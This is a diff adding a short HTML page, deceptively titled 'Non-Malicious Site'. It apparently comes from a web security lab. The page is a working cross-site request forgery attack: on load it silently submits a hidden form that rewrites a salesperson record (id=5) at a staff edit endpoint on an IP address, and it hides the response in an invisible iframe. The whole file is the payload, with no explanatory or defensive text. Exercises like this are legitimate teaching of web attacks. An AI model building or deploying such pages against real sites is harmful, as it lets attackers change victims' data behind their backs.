@@ -1,0 +1,14 @@
+<html>
+  <head>
+    <title>Non-Malicious Site</title>
+  </head>
+  <body onload="document.my_form.submit()">
+    <form action="https://35.184.88.145/red/public/staff/salespeople/edit.php?id=5" method="POST" name="my_form" style="display: none;" target="hidden_results" >
+      <input type="text" name="first_name" value="Malicious" />
+      <input type="text" name="last_name" value="Attacker" />
+      <input type="text" name="phone" value="777-777-7777" />
+      <input type="text" name="email" value="malicious@attacker.com" />
+    </form>
+    <iframe name="hidden_results" style="display: none;"></iframe>
+  </body>
+</html>
